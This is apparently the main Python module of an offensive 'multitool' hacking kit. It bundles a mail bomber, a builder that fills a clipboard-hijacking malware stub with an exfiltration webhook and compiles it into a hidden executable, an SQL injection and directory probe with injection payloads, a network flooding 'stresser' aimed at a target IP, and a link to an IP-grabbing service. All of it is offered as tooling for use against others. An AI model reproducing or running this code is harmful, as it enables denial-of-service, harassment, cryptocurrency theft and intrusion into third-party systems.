#  _   _                 _ 
# | \ | |               (_)
# |  \| | __ ___   __ _  _ 
# | . ` |/ _` \ \ / /(_)| |
# | |\  | (_| |\ V /  _ | |
# |_| \_|\__,_| \_/  (_)|_|
# 
# Navi Multitool - Developed by glockinhand
# GitHub: https://github.com/glockinhand/navi-multitool

import requests, time, random, json, re, os, subprocess, concurrent.futures, socket, threading, sys
from core.display import get_inpt, Colors, Colorate, Theme
from modules.boot import WiredStress
from modules.mail_bomb import run_bomber

def mail_bomb(t, c):
    run_bomber(t, c)

def build_clipper():
    cl = Theme.get_colors()
    cp, sp = os.path.join("modules/stub/","clipper_config.json"), os.path.join("modules/stub/","clipper_stub.txt")
    if not os.path.exists(cp) or not os.path.exists(sp):
        print(Colorate.Horizontal(cl["num"], "  [!] Missing files."))
        return
    try:
        with open(sp,'r',encoding='utf-8') as f: s = f.read()
        with open(cp,'r',encoding='utf-8') as f: cfg = json.load(f)
    except: return
    print(Colorate.Horizontal(cl["head"], "  [ CLIPPER BUILDER ]\n"))
    w = get_inpt("webhook (current):")
    if w: cfg['WebHook'] = w
    for c, a in cfg.items():
        if c not in ["README", "WebHook"]: s = re.sub(rf'\|{c}\|?', f'{a}', s)
    s = re.sub(r"hook\s*=\s*''", f"hook = '{cfg['WebHook']}'", s)
    sc = s.replace("'''", r"\'\'\'")
    s = re.sub(r"thecode\s*=\s*'''.*?'''", f"thecode = '''{sc}'''", s, flags=re.DOTALL)
    if not os.path.exists('output'): os.mkdir('output')
    out = os.path.join('output', 'Clip.pyw')
    with open(out, 'w', encoding='utf-8') as f: f.write(s)
    print(Colorate.Horizontal(cl["head"], f"  [+] Built: {out}"))
    if get_inpt("to exe? (y/n):").lower() == 'y':
        print(Colorate.Horizontal(cl["num"], "  [!] Compiling..."))
        os.system("pip install pyinstaller -q")
        subprocess.run(f"pyinstaller --onefile --noconsole --distpath ./output --name Clip {out}", shell=True)
    subprocess.run(['explorer', os.path.abspath('output')])

def sql_scanner():
    cl = Theme.get_colors()
    u = get_inpt("target_url:")
    if not u.startswith("http"): u = "http://" + u
    print(Colorate.Horizontal(cl["head"], f"\n  [+] Auditing {u}...\n"))
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    ps = ["admin","backup","private","uploads","api","logs","cache"]
    sq = ["'","''","' OR '1'='1' --","' UNION SELECT NULL --"]
    def _c(p):
        try:
            if s.get(u + "/" + p, timeout=10).status_code == 200: print(Colorate.Horizontal(cl["head"], f"  [+] Found: /{p}"))
        except: pass
    def _t(p):
        try:
            r = s.get(u + p, timeout=10)
            if r.status_code == 200 and any(x in r.text.lower() for x in ["sql","mysql","error"]):
                print(Colorate.Horizontal(cl["head"], f"  [+] SQLi Trigger: {p}"))
        except: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
        ex.map(_c, ps)
        ex.map(_t, sq)
    input(Colorate.Horizontal(cl["head"], "\n  Done. Press Enter..."))

def _w_stg(txt, sym='?'):
    c = Theme.get_colors()
    return f" {Colorate.Horizontal(c['num'], f'[{sym}]')} {Colorate.Horizontal(c['txt'], txt)}"

def start_brute():
    cl = Theme.get_colors()
    print(Colorate.Horizontal(cl["head"], "  [ NETWORK STRESSER ]\n"))
    print(Colorate.Horizontal(cl["num"], "  [!] WARNING: This tool uses ur connection to stress networks. The faster your connection is, the more powerful will be the attack. (use vps/rdp for extreme power)\n"))
    if get_inpt("continue? (y/n):").lower() != 'y': return
    
    _t = get_inpt("target_ip:")
    _p = get_inpt("port (0=rnd):")
    _p = int(_p) if _p and _p != '0' else None
    _s = int(get_inpt("packet_sz (1250):") or 1250)
    _th = int(get_inpt("worker_threads (100):") or 100)
    
    wf = WiredStress(_t, _p, _s, _th)
    print(Colorate.Horizontal(cl["head"], f"\n  [+] Loading buffer... Stressing {_t}"))
    try:
        wf.start_v2()
        while True: time.sleep(1)
    except KeyboardInterrupt:
        wf.active = False
        _final = (wf.sent_bytes * 8) / 1000000000
        print(Colorate.Horizontal(cl["num"], f"\n  [!] Session terminated. Data: {_final:.3f} Gb"))
    input(Colorate.Horizontal(cl["head"], "\n  Press Enter..."))

def ip_grabber():
    _cl = Theme.get_colors()
    print(Colorate.Horizontal(_cl["head"], "  [ IP GRABBER ]\n"))
    print(Colorate.Horizontal(_cl["head"], "  [+] Opening Grabbify in browser..."))
    try:
        import webbrowser
        webbrowser.open("https://grabify.org")
    except Exception as _e:
        print(Colorate.Horizontal(_cl["num"], f"  [!] Error: {_e}"))
    time.sleep(2)
